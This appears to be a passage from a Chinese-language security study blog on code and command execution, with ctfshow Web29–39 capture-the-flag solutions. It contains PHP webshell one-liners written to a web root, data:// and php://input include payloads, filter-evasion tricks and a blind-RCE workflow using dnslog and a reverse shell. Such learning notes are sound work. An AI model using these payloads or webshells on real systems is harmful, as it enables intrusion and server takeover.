src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250903203624060.png\" alt=\"image-20250903203624060\"></p>\n</li>\n</ul>\n</li>\n<li>\n<p><strong><code>Java</code> 中的代码执行类/方法</strong>（都不直接回显）有：</p>\n<ul>\n<li>\n<p><strong>常见方法</strong>：<code>ScriptEngine.eval()</code>、<code>Class.forName().newInstance()</code>、<code>Method.invoke()</code>、<code>ClassLoader.defineClass() + newInstance()</code></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250903203859443.png\" alt=\"image-20250903203859443\"></p>\n</li>\n<li>\n<p><strong>不常见方法</strong>：<code>JavaCompiler.compile()</code>、<code>GroovyShell.evaluate()</code>、<code>JRubyEngine.eval()</code>、<code>TemplatesImpl.newTransformer()</code></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250903203924081.png\" alt=\"image-20250903203924081\"></p>\n</li>\n</ul>\n</li>\n<li>\n<p><strong><code>Python</code> 中的代码执行函数</strong> 有：</p>\n<ul>\n<li>\n<p><strong>直接回显</strong>：<code>exec()</code>、<code>eval()</code>、<code>compile() + evec()</code></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250903204156085.png\" alt=\"image-20250903204156085\"></p>\n</li>\n<li>\n<p><strong>不直接回显</strong>：<code>eval()</code>、<code>exec()</code>、<code>__import__('builtins').exec()</code>、<code>types.FunctionType()</code>、<code>pickle.loads()</code></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250903204250566.png\" alt=\"image-20250903204250566\"></p>\n</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"相互转换\">相互转换</h5>\n<ul>\n<li>\n<p>一般来说，代码执行和命令执行是可以转换使用的</p>\n</li>\n<li>\n<p>遇到代码执行漏洞时，可以通过代码 <strong>调用命令执行函数实现命令执行</strong>，比如 <code>eval(system('ls'););</code></p>\n</li>\n<li>\n<p>但是遇到命令执行漏洞时，可以 <strong>将代码写入文件当中</strong>，然后让系统去 <strong>执行文件</strong>，比如写入 <code>webshell</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Linux(bash)</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;&lt;?php @eval($_POST[x]);?&gt;&#x27;</span> &gt; /var/www/html/shell.php</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Windows(cmd)</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> ^&lt;?php @<span class=\"built_in\">eval</span>(<span class=\"variable\">$_POST</span>[x]);?^&gt; &gt; D:\\xampp\\htdocs\\shell.php</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>或者直接包含一句话木马的语法，然后使用工具去尝试连接：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">连接地址：http://xxx/xx.php?code=<span class=\"built_in\">eval</span>(<span class=\"variable\">$_POST</span>[x]);</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h5 id=\"利用方法\">利用方法</h5>\n<ul>\n<li>代码执行：\n<ul>\n<li><strong>脚本</strong>：java、php、python</li>\n<li><strong>产生</strong>：Web 源码、中间件平台、其他环境</li>\n<li><strong>检测</strong>：白盒 --&gt; 代码审计</li>\n<li><strong>检测</strong>：黑盒 --&gt; 漏扫工具、公开漏洞、手工看参数及功能点</li>\n<li><strong>防御</strong>：敏感函数禁用、变量过滤或固定、WAF 产品、容器</li>\n</ul>\n</li>\n<li>命令执行：\n<ul>\n<li><strong>系统</strong>：Linux、Windows、Mac</li>\n<li><strong>产生</strong>：Web 源码、中间件平台、其他环境</li>\n<li><strong>检测</strong>：白盒 --&gt; 代码审计</li>\n<li><strong>检测</strong>：黑盒 --&gt; 漏扫工具、公开漏洞、手工看参数及功能点</li>\n<li><strong>防御</strong>：敏感函数禁用、变量过滤或固定、WAF 产品、容器</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"二、利用与绕过\">二、利用与绕过</h4>\n<h5 id=\"伪协议玩法\">伪协议玩法</h5>\n<ul>\n<li>\n<p><strong>配合文件包含</strong> 伪协议（代码执行）</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"variable\">$_GET</span>[a]<span class=\"meta\">?&gt;</span>&amp;a=data:<span class=\"comment\">//text/plain,&lt;?php system(&#x27;ver&#x27;);?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"variable\">$_GET</span>[a]<span class=\"meta\">?&gt;</span>&amp;a=php:<span class=\"comment\">//filter/read=convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h5 id=\"关键词绕过\">关键词绕过</h5>\n<ul>\n<li>\n<p>过滤 <code>flag</code> 关键字绕过方式：</p>\n<ul>\n<li>\n<p><strong>通配符</strong> 绕过：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fl*.p*</span><br><span class=\"line\">?fl*.ph?</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p><strong>转义符</strong> 绕过：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ca\\t fla\\g</span><br><span class=\"line\"><span class=\"built_in\">cat</span> fl<span class=\"string\">&#x27;&#x27;</span>ag</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p><strong>空变量</strong> <code>$*</code>、<code>$@</code>、<code>$x</code>、<code>$&#123;x&#125;</code> 绕过：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ca$*t fla<span class=\"variable\">$@g</span>  <span class=\"comment\">#因为没有设置变量，所以变量为空，从而达成绕过</span></span><br><span class=\"line\">ca<span class=\"variable\">$5t</span> fl<span class=\"variable\">$5ag</span></span><br><span class=\"line\"><span class=\"built_in\">cat</span><span class=\"variable\">$&#123;2&#125;</span>t f<span class=\"variable\">$&#123;2&#125;</span>lag</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p><strong>变量拼接法</strong> 绕过：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=fl;b=ag;<span class=\"built_in\">cat</span>$IFS$a<span class=\"variable\">$b</span>   </span><br><span class=\"line\"><span class=\"variable\">$IFS</span> 表示空格</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p><strong>反引号</strong> 绕过：反引号相当于让字符当作命令执行</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> `<span class=\"built_in\">ls</span>`</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p><strong>编码</strong> 绕过</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;flag&#x27;</span> | <span class=\"built_in\">base64</span> =&gt; ZmxhZwo=</span><br><span class=\"line\"><span class=\"built_in\">cat</span> `<span class=\"built_in\">echo</span> Z,xhZwo` | <span class=\"built_in\">base64</span> -d</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p><strong>组合绝活</strong> 绕过</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">touch</span> <span class=\"string\">&quot;ag&quot;</span>    <span class=\"comment\">#创建一个ag文件</span></span><br><span class=\"line\"><span class=\"built_in\">touch</span> <span class=\"string\">&quot;fl\\\\&quot;</span>  <span class=\"comment\">#创建一个fl\\\\文件</span></span><br><span class=\"line\"><span class=\"built_in\">touch</span> <span class=\"string\">&quot;t \\\\&quot;</span>  <span class=\"comment\">#创建一个t文件和根目录下所有文件</span></span><br><span class=\"line\"><span class=\"built_in\">touch</span> <span class=\"string\">&quot;ca\\\\&quot;</span>  <span class=\"comment\">#创建一个ca\\文件</span></span><br><span class=\"line\"><span class=\"built_in\">ls</span> -t &gt; shell <span class=\"comment\">#按照创造时间由进到远文件写入shell文件中</span></span><br><span class=\"line\">sh shell      <span class=\"comment\">#执行shell文件</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250903213135150.png\" alt=\"image-20250903213135150\"></p>\n</li>\n<li>\n<p><strong>异或无符号</strong> 绕过</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">异或：rce-xor.php &amp; rce-xor.py</span><br><span class=\"line\">或：rce-xor-or.php &amp; rce-xor-or.py</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>过滤函数关键字</strong> 绕过方式</p>\n<ul>\n<li>\n<p><strong>内敛执行</strong> 绕过（如过滤 <code>system</code>）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> `<span class=\"built_in\">ls</span>`</span><br><span class=\"line\"><span class=\"built_in\">echo</span> $(<span class=\"built_in\">ls</span>)</span><br><span class=\"line\">?&gt;&lt;?=`<span class=\"built_in\">ls</span>`;</span><br><span class=\"line\">?&gt;&lt;?=$(<span class=\"built_in\">ls</span>);</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p><strong>过滤执行命令</strong> 绕过方式（如 <code>cat</code>、<code>tac</code> 等）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">more <span class=\"comment\">#一页一页的显示档案内容</span></span><br><span class=\"line\">less <span class=\"comment\">#和more类似</span></span><br><span class=\"line\"><span class=\"built_in\">tail</span> <span class=\"comment\">#查看尾n行</span></span><br><span class=\"line\"><span class=\"built_in\">nl</span>   <span class=\"comment\">#显示的时候，顺便输出行号</span></span><br><span class=\"line\"><span class=\"built_in\">od</span>   <span class=\"comment\">#以二进制的方式读取档案的内容</span></span><br><span class=\"line\">vi   <span class=\"comment\">#进入编辑模式查看</span></span><br><span class=\"line\">vim  <span class=\"comment\">#进入编辑模式查看</span></span><br><span class=\"line\">nano <span class=\"comment\">#进入编辑模式查看</span></span><br><span class=\"line\"><span class=\"built_in\">sort</span> <span class=\"comment\">#可以查看</span></span><br><span class=\"line\"><span class=\"built_in\">uniq</span> -c <span class=\"comment\">#报错出具体内容</span></span><br><span class=\"line\">file -f <span class=\"comment\">#报错出具体内容</span></span><br><span class=\"line\">sh /flag 2&gt;%261 <span class=\"comment\">#报错出文件内容</span></span><br><span class=\"line\">curl file:///root/f/flag <span class=\"comment\">#请求本地内容</span></span><br><span class=\"line\">strings <span class=\"comment\">#可以查看</span></span><br><span class=\"line\">bash -v <span class=\"comment\">#可以查看</span></span><br><span class=\"line\">rev <span class=\"comment\">#可以查看</span></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n<li>\n<p><strong>过滤空格</strong> 绕过方式</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%09 <span class=\"comment\">#url传递参数</span></span><br><span class=\"line\"><span class=\"variable\">$IFS</span></span><br><span class=\"line\">拼接法</span><br><span class=\"line\">&#123;<span class=\"built_in\">cat</span>,flag&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h5 id=\"无回显利用\">无回显利用</h5>\n<p><strong>利用方式</strong></p>\n<ul>\n<li>直接写个文件访问查看是否生成</li>\n<li>让他来访问本地的文件看访问记录： <a href=\"https://forum.ywhack.com/bountytips.php?download\">https://forum.ywhack.com/bountytips.php?download</a></li>\n<li>反弹 shell：</li>\n<li><a href=\"https://forum.ywhack.com/shell.php\">https://forum.ywhack.com/shell.php</a></li>\n</ul>\n<p><strong>实战案例</strong></p>\n<ul>\n<li>\n<p>假设有这样一个源码，可以看到这个虽然有命令执行，但是是不会回显的：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"variable\">$code</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;code&#x27;</span>];</span><br><span class=\"line\"><span class=\"title function_ invoke__\">shell_exec</span>(<span class=\"variable\">$code</span>);</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>碰到这种，我们就可以使用上面的三种方式去看一看究竟命令有没有执行</p>\n</li>\n<li>\n<p>首先可以通过 <code>dnslog</code> 去看存不存在 <code>RCE</code>，比如这里我的 dns 地址为 <code>http://zv29gw.dnslog.cn</code>，然后我就尝试去让他 <code>ping</code> 这个地址：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250903220649576.png\" alt=\"image-20250903220649576\"></p>\n</li>\n<li>\n<p>这里成功看到回显</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250903220718258.png\" alt=\"image-20250903220718258\"></p>\n</li>\n<li>\n<p>因此存在 RCE，那我们就尝试去让他反弹 <code>shell</code>，先启动监听：</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250903220800283.png\" alt=\"image-20250903220800283\"></p>\n</li>\n<li>\n<p>然后在棱镜社区去生成一个反弹 <code>shell</code> 的命令</p>\n</li>\n</ul>\n<h4 id=\"三、白盒审计-代码命令执行\">三、白盒审计&amp;代码命令执行</h4>\n<ul>\n<li>这里用 ctfshow 的题目来进行绕过 rce 的演示</li>\n</ul>\n<h5 id=\"Web29-通配符\">Web29-通配符</h5>\n<ul>\n<li>\n<p>源码如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);  </span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">\t<span class=\"variable\">$c</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];  </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/flag/i&quot;</span>, <span class=\"variable\">$c</span>))&#123;  </span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"variable\">$c</span>);  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;    </span><br><span class=\"line\">\t<span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>他这里限制了 flag 的大小写，那我们可以通过 <code>fla*</code> 的方式来进行绕过</p>\n</li>\n<li>\n<p>payload: <code>?c=system('tac fla*');</code>，这里用 <code>tac</code> 是因为 <code>cat</code> 还得看源代码有点麻烦</p>\n</li>\n</ul>\n<h5 id=\"Web30-取代函数-通配符-管道符\">Web30-取代函数&amp;通配符&amp;管道符</h5>\n<ul>\n<li>\n<p>源码如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);  </span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">\t<span class=\"variable\">$c</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];  </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/flag|system|php/i&quot;</span>, <span class=\"variable\">$c</span>))&#123;  </span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"variable\">$c</span>);  </span><br><span class=\"line\">    &#125;        </span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t<span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>这里额外限制了 <code>system</code> 和 <code>php</code>，那我们就换个命令执行函数 <code>passthru()</code></p>\n</li>\n<li>\n<p>payload: <code>?c=passthru('tac fla*');</code></p>\n</li>\n</ul>\n<h5 id=\"Web31-参数逃逸\">Web31-参数逃逸</h5>\n<ul>\n<li>\n<p>源码如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);  </span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;  </span><br><span class=\"line\">    <span class=\"variable\">$c</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];  </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;/i&quot;</span>, <span class=\"variable\">$c</span>))&#123;  </span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"variable\">$c</span>);  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;  </span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>这题相较于上题需要处理的地方就是限制了空格和单引号，那么我们这里可以使用双引号和空格的 URL 编码 <code>%09</code> 进行绕过，payload：<code>?c=passthru(&quot;tac%09fla*&quot;);</code></p>\n</li>\n<li>\n<p>这题还有另一种办法参数逃逸。</p>\n</li>\n<li>\n<p>什么是参数逃逸呢？指的是攻击者在 <strong>只能控制 URL 某个参数（或 HTTP 报文里的某个字段）</strong> 的情况下，通过再“造”出新的、不受原有过滤规则约束的参数，从而把恶意指令“逃逸”到这些 <strong>新参数</strong> 里执行。</p>\n</li>\n<li>\n<p>比如这里我们可以先让 <code>c=eval($_POST[x]);</code>，然后再通过 POST 传入 <code>x=system('tac flag.php');</code></p>\n</li>\n</ul>\n<h5 id=\"Web32-36-配合文件包含-伪协议\">Web32~36-配合文件包含&amp;伪协议</h5>\n<ul>\n<li>\n<p>这几道题考的是一个类型的，这里就放到一起了</p>\n</li>\n<li>\n<p>源码如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);  </span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;</span><br><span class=\"line\">\t<span class=\"variable\">$c</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];  </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(/i&quot;</span>, <span class=\"variable\">$c</span>))&#123;  </span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"variable\">$c</span>);  </span><br><span class=\"line\">    &#125;    </span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t<span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>由于这里最关键的过滤了 <code>(</code>，所以我们不能再用函数了，但我们可以使用包含函数 <code>include</code> 去包含传入的文件流，这里因为 <code>include</code> 包含的是一个文件，所以传入的 <code>x</code> 需要是一个 <code>php</code> 文件流，所以我们可以用伪协议去得到一个执行恶意代码的文件流</p>\n</li>\n<li>\n<p>payload：<code>?c=include$_GET[x]?&gt;&amp;x=data://text/plain,&lt;?php system('tac flag.php');?&gt;</code></p>\n</li>\n</ul>\n<h5 id=\"Web37-39-包含-RCE-伪协议-通配符\">Web37~39-包含 RCE&amp;伪协议&amp;通配符</h5>\n<ul>\n<li>\n<p>源码如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"comment\">//flag in flag.php  </span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);  </span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>]))&#123;  </span><br><span class=\"line\">    <span class=\"variable\">$c</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;c&#x27;</span>];  </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/flag/i&quot;</span>, <span class=\"variable\">$c</span>))&#123;  </span><br><span class=\"line\">        <span class=\"keyword\">include</span>(<span class=\"variable\">$c</span>);  </span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;  </span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>这里只过滤 <code>flag</code>，所以可以通过通配符、转义符绕过</p>\n</li>\n<li>\n<p>不过这里使用的命令是 <code>include</code>，我们需要改一下 payload</p>\n</li>\n<li>\n<p>最后的 payload 为：<code>data://text/plain,&lt;?php system('tac fla\\g.php');?&gt;</code> 或者 <code>php://input post:&lt;?php system('tac fla*.ph*');?&gt;</code></p>\n</li>\n</ul>\n<h5 id=\"本地案例-异或无符号\">本地案例-异或无符号</h5>\n<ul>\n<li>\n<p>源码如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);  </span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);  </span><br><span class=\"line\"><span class=\"variable\">$code</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;code&#x27;</span>];  </span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/[a-z0-9]/i&#x27;</span>,<span class=\"variable\">$code</span>))&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;hacker&#x27;</span>);  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"><span class=\"keyword\">eval</span>(<span class=\"variable\">$code</span>);</span><br></pre></td></tr></table></figure>\n</li>\n<li>\n<p>这里过滤了 <code>a-z</code>、<code>0-9</code> 的所有字符，所以基本是什么都干不了了</p>\n</li>\n<li>\n<p>但是我们还是有绕过的办法，就是利用异或/或算法去让某两个无符号的字符异或/或得到一个有符号的字符</p>\n</li>\n<li>\n<p>这里提供了两个脚本直接可以使用，我们就用异或的来演示，首先需要修改条件为 <code>if</code> 语句里的限制条件</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250904214119860.png\" alt=\"image-20250904214119860\"></p>\n</li>\n<li>\n<p>运行脚本，它会生成一个 <code>res_xor.txt</code> 的字典文件</p>\n</li>\n<li>\n<p>打开 python 的脚本，将字典导入进去，运行</p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250904221157143.png\" alt=\"image-20250904221157143\"></p>\n<p><img src=\"../images/%E7%BD%91%E5%AE%89%E7%9F%A5%E8%AF%86%E7%82%B9/image-20250904221737827.png\" alt=\"image-20250904221737827\"></p>\n</li>\n</ul>\n<h4 id=\"四、黑盒测试\">四、黑盒测试</h4>\n<ul>\n<li>\n<p>一般黑盒要么就是 <strong>看参数</strong> 可能会出现一些 <code>cmd</code>、<code>shell</code>、<code>c</code>、<code>code</code> 的参数，那么这时候可以尝试代码或者命令执行</p>\n</li>\n<li>\n<p>但更多的是 